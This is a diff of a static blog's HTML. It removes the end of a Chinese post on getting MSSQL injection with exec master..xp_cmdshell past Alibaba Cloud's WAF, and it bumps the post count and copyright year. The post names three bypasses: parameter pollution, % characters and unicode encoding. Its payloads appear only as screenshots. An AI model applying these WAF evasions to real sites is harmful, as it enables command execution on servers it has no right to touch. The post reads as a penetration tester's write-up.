-<p>这里我经过测试，发现当exec和 master..xp_cmdshell一起出现时，则会被拦截，因此绕过一方面时破坏exec和master..xp_cmdshell中间的内容，还有就是master..xpcmdshell本身。可能是这个比较重要，我这里发现，当</p>
-<p>exec 和xp_cmdshell同时出现，不管中间是什么字符，都会被拦截。</p>
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726150806727.png" alt="image-20200726150806727"></p>
-<p><strong>绕过一：参数污染</strong></p>
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726150914069.png" alt="image-20200726150914069"></p>
-<p><strong>绕过二：%</strong></p>
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726150953254.png" alt="image-20200726150953254"></p>
-<p><strong>绕过三：unicode编码</strong></p>
-<p>我这里找了个e的unicode编码进行绕过</p>
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726151055989.png" alt="image-20200726151055989"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    其实这些方法在几年前都有很多大佬总结过，我也不过是按照他们提供的思路进行尝试，这里会发现云WAF的一个问题，就是他们针对于mysql拦截的比较全面，但是对于其他的数据库，可能没有那么全面。还有一些针对于容器的绕过方法，比如参数污染，%,甚至在aspx中还有%00特性也没有考虑到，当然，这个也有可能是因为我测试的这个站不是用的ASP+IIS的环境，才能让我顺利绕过。总之，WAF也是人写的，并没有那么可怕。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
@@ -2362,7 +2525,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-count">33</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -2400,7 +2563,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2020</span>
+  <span itemprop="copyrightYear">2021</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
